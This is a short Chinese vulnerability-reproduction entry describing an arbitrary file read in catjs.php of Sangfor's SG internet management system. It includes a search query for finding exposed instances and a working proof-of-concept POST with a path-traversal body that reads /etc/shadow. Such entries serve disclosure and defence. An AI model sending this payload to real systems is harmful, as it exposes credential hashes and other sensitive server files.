---
title: "深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞"
date: 2026-10-16 09:11:02
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 漏洞影响

深信服 SG上网优化管理系统

## 网络测绘

```
title=="SANGFOR上网优化管理"
```

## 漏洞复现

登陆页面

![image-20230828111216211](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111216211.png)

验证POC

```
POST /php/catjs.php

["../../../../../../etc/shadow"]
```

![image-20230828111228485](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111228485.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
